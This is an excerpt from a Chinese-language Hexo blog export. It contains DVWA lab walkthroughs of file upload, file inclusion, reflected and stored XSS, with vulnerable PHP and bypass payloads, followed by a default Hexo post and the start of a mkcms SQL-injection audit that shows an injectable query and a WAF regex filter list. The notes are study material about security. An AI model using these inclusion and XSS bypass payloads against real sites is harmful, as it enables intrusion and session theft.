&amp;&amp;</span><br><span class="line">		getimagesize( $uploaded_tmp ) ) &#123;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Can we move the file to the upload folder?</span></span><br><span class="line">		<span class="keyword">if</span>( !move_uploaded_file( $uploaded_tmp, $target_path ) ) &#123;</span><br><span class="line">			<span class="comment">// No</span></span><br><span class="line">			$html .= <span class="string">'&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="comment">// Yes!</span></span><br><span class="line">			$html .= <span class="string">"&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">// Invalid file</span></span><br><span class="line">		$html .= <span class="string">'&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;'</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>漏洞点</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//白名单验证文件后缀名必须为jpg、jpeg、png，且只验证最后一个.的后缀名，文件大小小于1000000	</span></span><br><span class="line">$uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, <span class="string">'.'</span> ) + <span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span>( ( strtolower( $uploaded_ext ) == <span class="string">"jpg"</span> || strtolower( $uploaded_ext ) == <span class="string">"jpeg"</span> || strtolower( $uploaded_ext ) == <span class="string">"png"</span> ) &amp;&amp;</span><br><span class="line">		( $uploaded_size &lt; <span class="number">100000</span> ) &amp;&amp;</span><br><span class="line">   </span><br><span class="line"><span class="comment">//此漏洞需结合文件包含来利用漏洞，上传一个图片马，用burp抓包，文件尾添加php代码,使用包含文件漏洞</span></span><br><span class="line">paylaod：</span><br><span class="line">   http:<span class="comment">//dvwa.com/vulnerabilities/fi/?page=file://C:/phpStudy/WWW/dvwa/hackable/uploads/z.png</span></span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gf9guep3foj30yb0jxafk.jpg" alt="image-20200529175029137"></p>
<p>代码成功执行</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gf9gvtcfi1j31h30qlagv.jpg" alt="image-20200529175150370"></p>
<h3 id="0x04-文件包含漏洞"><a href="#0x04-文件包含漏洞" class="headerlink" title="0x04 文件包含漏洞"></a>0x04 文件包含漏洞</h3><h4 id="Low级别漏洞代码-3"><a href="#Low级别漏洞代码-3" class="headerlink" title="Low级别漏洞代码"></a>Low级别漏洞代码</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; The page we wish to display</span><br><span class="line">$file &#x3D; $_GET[ &#39;page&#39; ];&#x2F;&#x2F;通过GET方式访问本地文件并包含，如果开始远程包含，也可使用远程包含。</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gf9vp45lixj31mr0u0dnq.jpg" alt="image-20200530022423028"></p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gfafuw9txvj317r0u044r.jpg" alt="image-20200530140153305"></p>
<h4 id="Medium级别漏洞代码-3"><a href="#Medium级别漏洞代码-3" class="headerlink" title="Medium级别漏洞代码"></a>Medium级别漏洞代码</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; The page we wish to display</span><br><span class="line">$file &#x3D; $_GET[ &#39;page&#39; ];</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Input validation</span><br><span class="line">$file &#x3D; str_replace( array( &quot;http:&#x2F;&#x2F;&quot;, &quot;https:&#x2F;&#x2F;&quot; ), &quot;&quot;, $file );</span><br><span class="line">$file &#x3D; str_replace( array( &quot;..&#x2F;&quot;, &quot;..\&quot;&quot; ), &quot;&quot;, $file );</span><br></pre></td></tr></table></figure>

<p>漏洞点</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;过滤http协议和..&#x2F; 、..\</span><br><span class="line">$file &#x3D; str_replace( array( &quot;http:&#x2F;&#x2F;&quot;, &quot;https:&#x2F;&#x2F;&quot; ), &quot;&quot;, $file );</span><br><span class="line">$file &#x3D; str_replace( array( &quot;..&#x2F;&quot;, &quot;..\&quot;&quot; ), &quot;&quot;, $file );</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;绕过方法，可以使用大小写、双写、file协议、...&#x2F;.&#x2F;，如果测试中获取到绝对路径，也可使用绝对路径来包含</span><br><span class="line">payload:</span><br><span class="line">http:&#x2F;&#x2F;dvwa.com&#x2F;vulnerabilities&#x2F;fi&#x2F;?page&#x3D;Http:&#x2F;&#x2F;127.0.0.1&#x2F;phpinfo.php</span><br><span class="line">http:&#x2F;&#x2F;dvwa.com&#x2F;vulnerabilities&#x2F;fi&#x2F;?page&#x3D;...&#x2F;.&#x2F;...&#x2F;.&#x2F;...&#x2F;.&#x2F;phpinfo.php</span><br><span class="line">http:&#x2F;&#x2F;dvwa.com&#x2F;vulnerabilities&#x2F;fi&#x2F;?page&#x3D;C:&#x2F;phpStudy&#x2F;WWW&#x2F;phpinfo.php</span><br><span class="line">http:&#x2F;&#x2F;dvwa.com&#x2F;vulnerabilities&#x2F;fi&#x2F;?page&#x3D;htthttp:&#x2F;&#x2F;p:&#x2F;&#x2F;127.0.0.1&#x2F;phpinfo.php</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gfagyb57asj314o0u0wk1.jpg" alt="image-20200530143948802"></p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gfah4a370vj31870u07fd.jpg" alt="image-20200530144533014"></p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gfah677hw0j312g0u0jyw.jpg" alt="image-20200530144723768"></p>
<h4 id="High级别漏洞代码-3"><a href="#High级别漏洞代码-3" class="headerlink" title="High级别漏洞代码"></a>High级别漏洞代码</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; The page we wish to display</span><br><span class="line">$file &#x3D; $_GET[ &#39;page&#39; ];</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Input validation</span><br><span class="line">&#x2F;&#x2F;只能使用file协议，并且file变量不等了include，此处直接包含其他文件即可</span><br><span class="line">if( !fnmatch( &quot;file*&quot;, $file ) &amp;&amp; $file !&#x3D; &quot;include.php&quot; ) &#123;</span><br><span class="line">    &#x2F;&#x2F; This isn&#39;t the page we want!</span><br><span class="line">    echo &quot;ERROR: File not found!&quot;;</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line">payload：</span><br><span class="line">http:&#x2F;&#x2F;dvwa.com&#x2F;vulnerabilities&#x2F;fi&#x2F;?page&#x3D;file:&#x2F;&#x2F;C:\phpStudy\WWW\phpinfo.php</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gfahu1340kj310k0u045v.jpg" alt="image-20200530151017862"></p>
<h3 id="0x05-反射型XSS漏洞"><a href="#0x05-反射型XSS漏洞" class="headerlink" title="0x05 反射型XSS漏洞"></a>0x05 反射型XSS漏洞</h3><h4 id="Low级别漏洞"><a href="#Low级别漏洞" class="headerlink" title="Low级别漏洞"></a>Low级别漏洞</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">header (&quot;X-XSS-Protection: 0&quot;);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Is there any input?</span><br><span class="line">&#x2F;&#x2F;获取地址栏name的值，并且name不等于空</span><br><span class="line">if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#39;name&#39; ] !&#x3D; NULL ) &#123;</span><br><span class="line">    &#x2F;&#x2F; Feedback for end user</span><br><span class="line">    &#x2F;&#x2F;将地址栏内容输出</span><br><span class="line">    echo &#39;&lt;pre&gt;Hello &#39; . $_GET[ &#39;name&#39; ] . &#39;&lt;&#x2F;pre&gt;&#39;;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;由于未做任何过滤，直接弹出xss代码</span><br><span class="line">payload: &lt;script&gt;alert(&#x2F;xss&#x2F;)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gfb0bfn3zoj31my0ho75p.jpg" alt="image-20200531014947963"></p>
<h4 id="Medium级别漏洞代码-4"><a href="#Medium级别漏洞代码-4" class="headerlink" title="Medium级别漏洞代码"></a>Medium级别漏洞代码</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#39;name&#39; ] !&#x3D; NULL ) &#123;</span><br><span class="line">	&#x2F;&#x2F; Get input</span><br><span class="line">	&#x2F;&#x2F;此处过滤了&lt;script&gt;</span><br><span class="line">	$name &#x3D; str_replace( &#39;&lt;script&gt;&#39;, &#39;&#39;, $_GET[ &#39;name&#39; ] );</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; Feedback for end user</span><br><span class="line">	$html .&#x3D; &quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;&#x2F;pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;绕过，使用大小写绕过、双写绕过或其他函数绕过</span><br><span class="line">payload:</span><br><span class="line">	&lt;body onload&#x3D;&quot;alert(&#39;xss&#39;)&quot;&gt;&lt;&#x2F;body&gt;</span><br><span class="line">	 &lt;input onfocus&#x3D;&quot;alert(&#39;1&#39;)&quot; autofocus&#x2F;&gt;</span><br><span class="line">	 &lt;sc&lt;script&gt;ript&gt;alert(&#x2F;xss&#x2F;)&lt;&#x2F;script&gt;</span><br><span class="line">	 &lt;SCRIPT&gt;alert(&#x2F;xss&#x2F;)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gfb0h825hjj317o0hmwfj.jpg" alt="image-20200531015521665"></p>
<h4 id="High级别漏洞代码-4"><a href="#High级别漏洞代码-4" class="headerlink" title="High级别漏洞代码"></a>High级别漏洞代码</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#39;name&#39; ] !&#x3D; NULL ) &#123;</span><br><span class="line">	&#x2F;&#x2F; Get input</span><br><span class="line">	&#x2F;&#x2F;此处使用正则表达式对大小写，双写等做了过滤</span><br><span class="line">	$name &#x3D; preg_replace( &#39;&#x2F;&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t&#x2F;i&#39;, &#39;&#39;, $_GET[ &#39;name&#39; ] );</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; Feedback for end user</span><br><span class="line">	$html .&#x3D; &quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;&#x2F;pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;绕过方法，使用其他函数绕过</span><br><span class="line">payload：</span><br><span class="line">	&lt;body onload&#x3D;&quot;alert(&#39;xss&#39;)&quot;&gt;&lt;&#x2F;body&gt;</span><br><span class="line">	 &lt;input onfocus&#x3D;&quot;alert(&#39;1&#39;)&quot; autofocus&#x2F;&gt;</span><br><span class="line">	 &lt;img src&#x3D;1 onerror&#x3D;alert(&#x2F;xss&#x2F;)&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gfb0mh7j65j31gg0e20tz.jpg" alt="image-20200531020025026"></p>
<h3 id="0x06-存储型XSS漏洞"><a href="#0x06-存储型XSS漏洞" class="headerlink" title="0x06 存储型XSS漏洞"></a>0x06 存储型XSS漏洞</h3><h4 id="Low级别漏洞代码-4"><a href="#Low级别漏洞代码-4" class="headerlink" title="Low级别漏洞代码"></a>Low级别漏洞代码</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'btnSign'</span> ] ) ) &#123;<span class="comment">//判断post中的btnsign是否已设置</span></span><br><span class="line">	<span class="comment">// Get input</span></span><br><span class="line">	$message = trim( $_POST[ <span class="string">'mtxMessage'</span> ] );<span class="comment">//获取参数并移动字符串两端空白字符</span></span><br><span class="line">	$name    = trim( $_POST[ <span class="string">'txtName'</span> ] );</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Sanitize message input</span></span><br><span class="line">	$message = stripslashes( $message );<span class="comment">//将转义的字符串去除，例如\'，去掉\</span></span><br><span class="line">    <span class="comment">//判断是否成功连接数据库，并且数据库返回的值是一个对象，是，就讲变量中的字符以合法的sql语句存入数据库</span></span><br><span class="line">	$message = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $message ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Sanitize name input</span></span><br><span class="line">	$name = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $name ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Update database</span></span><br><span class="line">    <span class="comment">//此处直接拼接，且未对xss语句进行过滤导致存储型xss</span></span><br><span class="line">	$query  = <span class="string">"INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );"</span>;</span><br><span class="line">	$result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . ((is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_error($GLOBALS[<span class="string">"___mysqli_ston"</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="keyword">false</span>)) . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">	<span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line">payload:&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></figure>



<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gfb0yr72qaj31ie0k00tu.jpg" alt="image-20200531021212990"></p>
<h4 id="Medium级别漏洞代码-5"><a href="#Medium级别漏洞代码-5" class="headerlink" title="Medium级别漏洞代码"></a>Medium级别漏洞代码</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'btnSign'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $message = trim( $_POST[ <span class="string">'mtxMessage'</span> ] );</span><br><span class="line">    $name    = trim( $_POST[ <span class="string">'txtName'</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    <span class="comment">//strip_tags 从字符串中剥离HTML和PHP标签，并使用addslashes转义</span></span><br><span class="line">    $message = strip_tags( addslashes( $message ) );</span><br><span class="line">    $message = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $message ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line">    $message = htmlspecialchars( $message );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    <span class="comment">//过滤script</span></span><br><span class="line">    $name = str_replace( <span class="string">'&lt;script&gt;'</span>, <span class="string">''</span>, $name );</span><br><span class="line">    $name = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $name ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    $query  = <span class="string">"INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );"</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . ((is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_error($GLOBALS[<span class="string">"___mysqli_ston"</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="keyword">false</span>)) . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//绕过方法，在审查元素中对name值进行修改，绕过name长度限制，使用大小写绕过</span></span><br><span class="line">payload:</span><br><span class="line">	&lt;SCRIPT&gt;alert(/time/)&lt;/script&gt;</span><br><span class="line">	&lt;sc&lt;script&gt;ript&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gfb150iokrj31hs0hmn04.jpg" alt="image-20200531021813496"></p>
<h4 id="High级别漏洞代码-5"><a href="#High级别漏洞代码-5" class="headerlink" title="High级别漏洞代码"></a>High级别漏洞代码</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'btnSign'</span> ] ) ) &#123;</span><br><span class="line">	<span class="comment">// Get input</span></span><br><span class="line">	$message = trim( $_POST[ <span class="string">'mtxMessage'</span> ] );</span><br><span class="line">	$name    = trim( $_POST[ <span class="string">'txtName'</span> ] );</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Sanitize message input</span></span><br><span class="line">	$message = strip_tags( addslashes( $message ) );</span><br><span class="line">	$message = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $message ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line">	$message = htmlspecialchars( $message );</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Sanitize name input</span></span><br><span class="line">    <span class="comment">//此处使用正则表达式对大小写，双写等做了过滤</span></span><br><span class="line">	$name = preg_replace( <span class="string">'/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i'</span>, <span class="string">''</span>, $name );</span><br><span class="line">	$name = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $name ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Update database</span></span><br><span class="line">	$query  = <span class="string">"INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );"</span>;</span><br><span class="line">	$result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . ((is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_error($GLOBALS[<span class="string">"___mysqli_ston"</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="keyword">false</span>)) . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">	<span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//绕过方法，使用其他函数绕过</span></span><br><span class="line">payload：</span><br><span class="line">	&lt;body onload=<span class="string">"alert('xss')"</span>&gt;&lt;/body&gt;</span><br><span class="line">	 &lt;input onfocus=<span class="string">"alert('1')"</span> autofocus/&gt;</span><br><span class="line">	 &lt;img src=<span class="number">1</span> onerror=alert(/xss/)&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gfb1a33u8dj31g10u0gr6.jpg" alt="image-20200531022306198"></p>
]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>漏洞靶场，学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2020/05/31/hello-world/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=29807319&auto=1&height=66"></iframe>

<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p>
]]></content>
  </entry>
  <entry>
    <title>mkcms注入审计学习</title>
    <url>/2020/06/01/mkcms%E6%B3%A8%E5%85%A5%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gfd5w8cgmtj30zk0m8109.jpg" alt="32"></p>
<a id="more"></a>

<h3 id="0x00-目标"><a href="#0x00-目标" class="headerlink" title="0x00 目标"></a>0x00 目标</h3><p>本次学习目标为找出mkcms的sql注入漏洞</p>
<h3 id="0x01-CMS目录说明"><a href="#0x01-CMS目录说明" class="headerlink" title="0x01 CMS目录说明"></a>0x01 CMS目录说明</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">核心目录</span><br><span class="line">admin	管理员目录</span><br><span class="line">data 	页面显示模板</span><br><span class="line">editor	kindeditor编辑器上传目录</span><br><span class="line">install	安装目录</span><br><span class="line">system	配置信息，数据库连接文件等</span><br><span class="line">ucenter	用户目录</span><br></pre></td></tr></table></figure>

<h3 id="0x02-审计工具使用"><a href="#0x02-审计工具使用" class="headerlink" title="0x02 审计工具使用"></a>0x02 审计工具使用</h3><p>对于新手来说，当然是先各种审计工具一把梭，用法师的审计工具对mkcms自动审计一波，扫出了不少漏洞。</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gfd7yw1cjhj318r0u07c2.jpg" alt="image-20200601234539613"></p>
<h3 id="0x03-后台管理员修改处SQL注入漏洞"><a href="#0x03-后台管理员修改处SQL注入漏洞" class="headerlink" title="0x03 后台管理员修改处SQL注入漏洞"></a>0x03 后台管理员修改处SQL注入漏洞</h3><p>主题是挖sql注入，自然是先怼注入，第一个是后台管理员修改处</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//为了简洁，我删除了部分代码，留下漏洞代码,此漏洞存在admin/cms_admin_edit.php</span></span><br><span class="line">    $result = mysql_query(<span class="string">'select * from mkcms_manager where m_id = '</span>.$_GET[<span class="string">'id'</span>].<span class="string">''</span>);</span><br><span class="line">	<span class="keyword">if</span>($row = mysql_fetch_array($result))&#123;</span><br><span class="line"><span class="comment">//此处代码未做过滤，直接拼接(当时没有看安全函数，直接就刚了)</span></span><br></pre></td></tr></table></figure>

<p>代码是这样的</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gfd8ehyd4uj31490u07hi.jpg" alt="image-20200602000039646"></p>
<p>直接抓包做测试，使用审计工具中的mysql数据库监控工具，长这样子</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gfd8hpfgjxj31hj0u0myz.jpg" alt="image-20200602000344692"></p>
<p>万事俱备，只差测试了，各种‘、“、and 1=1、 and 1=2测试，结果？？？</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gfd8jr3kh7j317o0owmye.jpg" alt="image-20200602000542031"></p>
<p>作为新手慌得一批，感觉又是各种安全函数，过滤函数，正则过滤啥的。。所以直接上sqlmap跑一波验证一下，如果这个点跑不出来，直接就放了。。毕竟小白，不会像大佬各种绕过。</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gfd8m8f0ukj30vo0kagxx.jpg" alt="image-20200602000806115"></p>
<p>看见这个心放下了，说明没有找错，回去翻一下，发现system下有个safe.php，内容是这样的</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$getfilter=<span class="string">"'|(and|or)\\b.+?(&gt;|&lt;|=|in|like)|\\/\\*.+?\\*\\/|&lt;\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)"</span>;</span><br><span class="line">$postfilter=<span class="string">"\\b(and|or)\\b.&#123;1,6&#125;?(=|&gt;|&lt;|\\bin\\b|\\blike\\b)|\\/\\*.+?\\*\\/|&lt;\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)"</span>;</span><br><span class="line">$cookiefilter=<span class="string">"\\b(and|or)\\b.&#123;1,6&#125;?(=|&gt;|&lt;|\\bin\\b|\\blike\\b)|\\/\\*.+?\\*\\/|&lt;\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)"</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">StopAttack</span><span class="params">($StrFiltKey,$StrFiltValue,$ArrFiltReq)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(is_array($StrFiltValue))&#123;</span><br><span class="line">		$StrFiltValue=implode($StrFiltValue);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (preg_match(<span class="string">"/"</span>.$ArrFiltReq.<span class="string">"/is"</span>,$StrFiltValue)==<span class="number">1</span>)&#123;</span><br><span class="line">		<span class="keyword">print</span> <span class="string">"非法操作!"</span>;</span><br><span class="line">		<span class="keyword">exit</span>();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $key=&gt;$value)&#123;</span><br><span class="line">	StopAttack($key,$value,$getfilter);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>($_POST <span class="keyword">as</span> $key=&gt;$value)&#123;</span><br><span class="line">	